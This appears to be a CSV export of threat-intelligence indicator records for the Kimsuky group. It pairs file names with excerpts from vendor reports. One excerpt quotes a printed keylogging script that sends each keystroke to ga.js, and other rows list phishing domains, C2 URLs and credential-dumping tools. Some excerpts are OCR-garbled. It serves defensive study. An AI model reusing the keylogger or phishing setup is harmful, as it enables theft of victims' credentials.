schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--kimsuky,artifact--sha256:9065cfdf92c0a0e367958b00b88865774e3f976b454a197c5a6dbf6b6725d33f,observation--sha256:2a5502d4057d66b1cb1975b6b3724d026309540a9273e15a4c4f1d778ae98948,file-name,g.php,g.php,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9065cfdf92c0a0e367958b00b88865774e3f976b454a197c5a6dbf6b6725d33f,observation--sha256:a4bc4c27ad113c83e63d5b8cf1b5f028fe572bdf2c63d426b6fa9329b4336c03,file-name,g.php,g.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--85ca2c2dc29118d8,kimsuky/APTDown/phrack-apt-down-the-north-korea-files_.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"MAPT Down: The N o r t h Korea Files The Google Chrome conﬁguration ﬁles contain these links. Does KIM use (his?) google creds t o access these sites? Is w w h 1 0 0 4 his G i t H u b account? Did he use google-pay t o pay f o r the three VPN services? ""https://accounts.google.com:443, https://[*.]0x1.gitlab.io"": ""https://accounts.google.com:443, https://[*.]aldeid.com"": ""https://accounts.google.com:443, https://[*.Jasawicki.info"": ""https://accounts.google.com:443, https://[*.]devglan.com"": ""htt",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6e67fcddbe9ad959ceed3835c8d49ab3bc4d1147ab608866da517929d0269c09,observation--sha256:0be7fde89aaef4eae25ccca8fdc80d5383b187e95c1d97610c2619dff90ca8e7,file-name,ga.js,ga.js,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 10}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 10 VIRUS BULLETIN CONFERENCE OCTOBER 2021 Stage 01: analytics.js?_=[BASE64(ID)]&token=[BASE64(Target)]=&delay=30&m=login After a warning window is displayed indicating that the session has been terminated and moving to the login page, it is disguised as if it has moved to the webmail login page (any page can be loaded through the iframe tag). The keylogging script works on the moved webmail disguised page, and the account",
1.0.0,actor--kimsuky,artifact--sha256:6e67fcddbe9ad959ceed3835c8d49ab3bc4d1147ab608866da517929d0269c09,observation--sha256:fb5450aea3fba424ac985f691cbe4956a946644424b600ca90927737975d3622,file-name,(ga.js,ga.js,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 11}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 11VIRUS BULLETIN CONFERENCE OCTOBER 2021 Stage 02: bootstrap.js?_=[BASE64(ID)]&token=[BASE64(Target)]=&m=login (Web page newly moved by iframe.) <script> </script><scripttype=""text/javascript""> $(function(){ functionsend(value=""""){ $.ajax({ url:""ga.js"", type:""post"", data:{ _:""[BASE64(ID)]"", token:btoa(value) } }); } $(""input"").keydown(function(evt) { send(""keydown:""+evt.target.value); }); $(""input"").change(function(evt) {",
1.0.0,actor--kimsuky,artifact--sha256:6e67fcddbe9ad959ceed3835c8d49ab3bc4d1147ab608866da517929d0269c09,observation--sha256:5ed02e3ea6aa170ccb59649b84988592a5a4e35878729479b15b25e31de986f3,file-name,ga.js,ga.js,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 9}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 9VIRUS BULLETIN CONFERENCE OCTOBER 2021 3.1 Phishing: spear-phishing link When browsing the email, it looks like it contains simple text (‘>> erroneous sending email’), but in fact it contains HTML code. One of the problems was that when the email was read on the webmail service, it was moved to the phishing page configured by the attacker.  Mailing Toolkit (phishing email sending URL): wallet-info.esy.es/mail_ok.php  S",
1.0.0,actor--kimsuky,artifact--sha256:07db025570777f2785aff3a9acd7b1d9c1d6fb1f5322e4684a82e5da996d73b7,observation--sha256:f309c3292ab66db927401b58624b6af2cf0269c7cc138ad5e953ed0d7d401edb,file-name,gamelist.php,gamelist.php,candidate,2022-05-13T00:00:00Z,day,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 57}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.11. C2도메인유사도 ○C2 도메인에서도유사도를확인할수있으며, VBS 1 / JSE 1 유형의도메인은작년5월안랩에서공개한Kimsuky보고서 의C2도메인과유사한형태가사용됐었습니다. 10 ○JSE 1 유형부터는C2 도메인형태에변화가있었고이후유형들은기존의Kimsuky도메인유형과는달라졌으며, 점차단순화되는형태를띄고있습니다. [표4-5] C2도메인유사도 10 Ahnlab- 다양한주제의보도자료를사칭한Kimsuky공격시도 Genians SecurityCenter 56 유형 날짜 C2Domain Kimsuky 2022-05-13 mc[.]pzs.kr/themes/mobile/images/about/temp/upload/list.php?query=1 VBS1 2022-02-09 sktelecom[.]help/download/select.php?type=12022-03-15 encorpost[.]com/post/post.php?type=12022-0",
1.0.0,actor--kimsuky,artifact--sha256:cd5cc88b006b2e29ee1a598b13c370cf5c2c24bbca8a8161e79840b4c24ec865,observation--sha256:0075219b835b932399f1a8f64ec3a4efecbee007c68d9034ee1d5380fbdeaac0,file-name,gb.js,gb.js,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ May 2023, 183.111.100.193(KR) Cook folder, files required for malware operation, and Google Chrome Extension stored index.php, index_.php, index1.php files, phishing proxy page ÿ March 2023, domestic stopover (KR) Yahoo Stores gb.js, ja.js, ko.js, etc. required for folder and phishing URL operation. ÿ September 2022, 185.176.43.106(BG) Operation Covert Stalker Report The process by which the Kimsuky organization sends phishing emails is summarized as shown below (Figure 23). URL ÿ Yahoo folder",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c35a407e0fc50c8432a246f7e5c580ca3d6d60bf3dfa637b6b86bf554d1ceb8c,observation--sha256:8c9c880bb00b9d31f9edee7d6f88a56c367882d486b1c07bc8f550d02585699e,file-name,generator.php,generator.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 154}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,- See fish-url.txt & generator.php to learn about password re-use patterns.,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c35a407e0fc50c8432a246f7e5c580ca3d6d60bf3dfa637b6b86bf554d1ceb8c,observation--sha256:2a6baf6bdd8bec48b508dde9ad370207ef536b5f938ba307bd2ada3b43a21b10,file-name,generator.php,generator.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 399}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,-[ generator.php:,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c35a407e0fc50c8432a246f7e5c580ca3d6d60bf3dfa637b6b86bf554d1ceb8c,observation--sha256:43d294a5eb22b673ba961859132d156f491518a470fc5c7e536d5cecd0756172,file-name,generator.php,generator.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 406}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,"curl -v --cookie ""HnoplYTfPX=x"" https://phishing-site/generator.php",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c35a407e0fc50c8432a246f7e5c580ca3d6d60bf3dfa637b6b86bf554d1ceb8c,observation--sha256:f6b4463456575e1b4b09e1a59eee0db6b414212858c38a0f42c61192cc8cfa54,file-name,generator.php,generator.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--85ca2c2dc29118d8,kimsuky/APTDown/phrack-apt-down-the-north-korea-files_.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"MAPT Down: The N o r t h Korea Files The Google Chrome conﬁguration ﬁles contain these links. Does KIM use (his?) google creds t o access these sites? Is w w h 1 0 0 4 his G i t H u b account? Did he use google-pay t o pay f o r the three VPN services? ""https://accounts.google.com:443, https://[*.]0x1.gitlab.io"": ""https://accounts.google.com:443, https://[*.]aldeid.com"": ""https://accounts.google.com:443, https://[*.Jasawicki.info"": ""https://accounts.google.com:443, https://[*.]devglan.com"": ""htt",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3c0d10e4102ac2112e7a744431ee1d8b4ee3afdb321a95c0988797a8b9986a84,observation--sha256:769bd4ff2b160687c775c6be9b0cd76ca7f3eec7b5fc4f4289e9275321458ccd,file-name,gpki.7z,gpki.7z,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 294}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,- gpki.7z = government-PKI: contains internal data about the South Korean,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b6ced3b81dddfb627dfb532069ccfd37ed202755cc2ac7692a47dd432f734c10,observation--sha256:13aa0ee5d279b9418c69ba1aa9f9766afa842e642356aa86bafeae7773804db6,file-name,hh.exe,hh.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 11}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 3.2. sgic_info.html ○CHM파일을실행할경우, 내부에포함되어있는HTML파일이실행됩니다.이때, HTML파일의하단에존재하는악성스크립트가윈도우도움말실행프로그램인hh.exe 를통해CHM파일을“C:\Users\Public\Libraries” 경로에디컴파일합니다. 이후, 디컴파일을통해추출된악성Docs.jse파일을wscript.exe 로실행합니다. [그림3-4] HTML내부스크립트 [그림3-5] 디컴파일탐지 Genians SecurityCenter 10",
1.0.0,actor--kimsuky,artifact--sha256:b6ced3b81dddfb627dfb532069ccfd37ed202755cc2ac7692a47dd432f734c10,observation--sha256:f05897dbfb9c152dd3aca789f3b1a6e30f4595d44ca1b686c860bcf06eb62a1c,file-name,hh.exe,hh.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 42}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport ○JSE 2 유형은이전유형들과다르게HTML 파일내부에BASE64 로인코딩된악성스크립트가 존재하지 않습니다. 대신 hh.exe 의 디컴파일 명령어를 통해 CHM 파일내부에컴파일된악성JSE파일을드롭한다는특징을가지고있습니다. [그림4-16] JSE2유형의HTML코드 Genians SecurityCenter 41,
1.0.0,actor--kimsuky,artifact--sha256:b6ced3b81dddfb627dfb532069ccfd37ed202755cc2ac7692a47dd432f734c10,observation--sha256:fd7043af223120294b128a61096942b405d2c46648972dc98dd0660b6c22a611,file-name,hh.exe,hh.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 43}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○hh.exe 통해CHM파일을디컴파일할경우, HTML 파일과함께컴파일된파일이추출됩니다. 해당 CHM 파일에는 JSE 파일이 함께 컴파일되어 있으며, 디컴파일 시HTML, JSE파일이추출됩니다. ○JSE 2 유형부터는JSE 파일내부코드를“+” 기호로분리했으며, 이는보안솔루션의탐지를피하기위한방법으로보입니다. [그림4-17] JSE2유형의JSE파일 Genians SecurityCenter 42",
1.0.0,actor--kimsuky,artifact--sha256:47785b44de02e6028156ea40aeff3106a56903fe4f703722bf96c93350e982e9,observation--sha256:37a9472a16c5bacb0241f76630f3e890cf9f1ecef87cc388a4f4dc7498dd0824,file-name,hncupdate.exe,hncupdate.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ebdb8ff325657128f79dcf0e25fdcdb90a5716c1abfa0abd6b8474a6c5b2bdbd,observation--sha256:4cc26e5c69df595252015083642d5e83e53ade26c8db4c91a81ed83047f33268,file-name,home.php,home.php,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ed42047e1d5a14bdc9ae7371783a86a319a9913ac6f8b92a60745ef9d802c678,observation--sha256:7ae9ce65ffc7d2d7d085fed28eb5c7576eb2fd3e2b24666801d904475f521271,file-name,homeland.docx,homeland.docx,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 88}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"V3 diagnosis name Consent Form_Princeton Study.pdf Zoom meeting information Opinions on the unification of the Korean Peninsula and the situation in neighboring countries This is the blocking log. pbA== _MAL_BLOCK North Korea's Nuclear Threat: South Korea's Perceptions and US Deterrence of Nuclear Expansion This is a document containing information related to the state of affairs in the country. We must build a prosperous homeland.docx When executing a malicious batch file, it is part of the dec",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e856d1f4e726020bc978c074544f066b785412a6ae1f5305a127d6da0e291206,observation--sha256:6a17502c38ac19666835ae3d26f77bbfa2aa71369bf8eda18cdb5ee923b192d3,file-name,host.exe,host.exe,candidate,2023-07-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 84}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Executes 10:17:22 Connect to N/A 10:29:25 2023-07-17 2023-07-18 Operation Covert Stalker Report File Less explorer.exe network 10:29:25 explorer.exe Process Executes 5911.pdf.exe N/A 2023-07-18 mshta.exe 2023-07-14 2023-07-14 process process network Creates This is an excerpt of some of the malicious actions performed by the Kimsuky organization on 14*.10*.23*.21*(US), which occurs through malware testing. mshta.exe 10:29:25 10:17:22 2023-07-18 [+] (ASEC Blog) “Distributing malware disguised as ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1d803d2c278274f583e4ff2ecf1735c1381f35a32e0cf38728e8ffbf4bdcb8cf,observation--sha256:66368aafaa85315b2ae11e3fb497fffeb12e247ddef4bf94b03cdd3a8236cf18,file-name,iepv.exe,iepv.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:671745e8a4092868d418ddfc9a535b81d041c2abe013ad1f60b1c9f99827d059,observation--sha256:ba29767743d58550ceb7713776488d3b0e910a6c9deb851a7b98414d682760fa,file-name,implications.pdf,implications.pdf,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 46}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"cuser.log 'accounts.kakao.com' => 46 Mail)****jIyMi5jb20=&rtnurl=(encoded in BASE64, normal URL)aHR0cHM6Ly9tYWlsLm5hdmVyLmNvbQ==&mode=n Operation Covert Stalker Report 'track.tiara.daum.net' => 'track_tiara_daummt.certuser.info', 'office.com' => 'certuser.info' 'aadcdn.msauth.net' => 'aadcdnmsauthdose.certuser.info', (Table 20) File analysis results obtained from certuser.info kakao The normal URL you access is saved, which is used to avoid suspicion of hacking targets by encouraging access to t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:671745e8a4092868d418ddfc9a535b81d041c2abe013ad1f60b1c9f99827d059,observation--sha256:e884a486e71c2c5d70857cde69bc76856852cb40452fdb170ba91c908c9b4151,file-name,implications.pdf,implications.pdf,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"nidlog.navernail.e staticnidlog.navernail. er.info (Table 21) Malicious URL mapped to this host IP navermail.info Operation Covert Stalker Report kr accountsmt.certus nidnaver.cnnail.info r.info cemember.info loginssig.servicem fo 48 certuser.info rcaptchanid.nae stat_tiarakk.cert In the Kakao case, the QR code login method was also abused as shown below (Figure 33). When you log in to the phishing URL, index.php (proxy page) saves the access log in a file with the IP of the hacking target, and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:344882c412da545a8876b8c41eb15e27a945d745ec1f5d348e64420782de86f1,observation--sha256:6df92d6df43a82ac80139f196b8ba8c4538f2694732528d8d00ce9826ed29052,file-name,index(2).php,index(2).php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:c510ccf3eded4816c5fdbc12564efba6916330fa47f07e2f59437decad7b8fd5,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ May 2023, 183.111.100.193(KR) Cook folder, files required for malware operation, and Google Chrome Extension stored index.php, index_.php, index1.php files, phishing proxy page ÿ March 2023, domestic stopover (KR) Yahoo Stores gb.js, ja.js, ko.js, etc. required for folder and phishing URL operation. ÿ September 2022, 185.176.43.106(BG) Operation Covert Stalker Report The process by which the Kimsuky organization sends phishing emails is summarized as shown below (Figure 23). URL ÿ Yahoo folder",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:07eaeb655dd167ed90176d715fa89d6b4e52596d1245d313c3dfbab1c8aa84dc,file-name,(index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Although we did not secure the original email related to the phishing in the above (Figure 23), considering the past actions of the Kimsuky organization, when sending a phishing email, it would have included a link to a large attachment or a link in the email body, and when the user clicks on the link, the index. You will access the Yahoo login page through php (proxy page). hxxp://www.namastte.kr/yahoo/index.php?menu=Y2ltb*****==&q=hxxps://login.yahoo.com/?.src=ym&pspi d=2023538075&activity=yba",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:ec33fcaee383e79f4694b1c20c01606585abcdbfa0d25677836693bd19480acc,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"[+] (Ministry of Unification) North Korea Information Portal: ua.zip hxxps://nkinfo.unikorea.go.kr/nkp/term/skNkItTerm.do?pageIndex=32 (Table 15) At the time of recognizing the purpose of the Cook folder, namastte, only show.php existed, so it was difficult to determine the exact upload method or its relationship with other files, but it was confirmed in the analysis of other cases. Malware that uses show.php is shown below (Figure 26). I found a North Korean expression in the comments of index.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:5953ac929fd6003b14fbfccefb2e5957d9849a435ca8ed837d4922dba9530296,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"'www.daum.net' => 'wwwma.certuser.info', It was analyzed and summarized below (Table 20). 'logins.daum.net' => 'loginsma.certuser.info', 'aadcdn.msauth.net' => 'aadcdnmsauthmicrosoftharvard.certuser.info', page 'live.com' => 'certuser.info', *****@hks.havard.edu hacking target At the time of recognizing this Case Study, C2 had four folders, including daum, harvard, kakao, and outlook, and each folder contained a phishing site. 'outlook.office365.com' => 'mailmicrosoftharvard.certuser.info', ÿ Se",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:062f76b113b0067a466f80e4dccb4f2334b7f4ce7419cb4d33704569ec7f9596,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"nidlog.navernail.e staticnidlog.navernail. er.info (Table 21) Malicious URL mapped to this host IP navermail.info Operation Covert Stalker Report kr accountsmt.certus nidnaver.cnnail.info r.info cemember.info loginssig.servicem fo 48 certuser.info rcaptchanid.nae stat_tiarakk.cert In the Kakao case, the QR code login method was also abused as shown below (Figure 33). When you log in to the phishing URL, index.php (proxy page) saves the access log in a file with the IP of the hacking target, and ",Actor-directory corpus sweep; ambiguous values remain candidates.
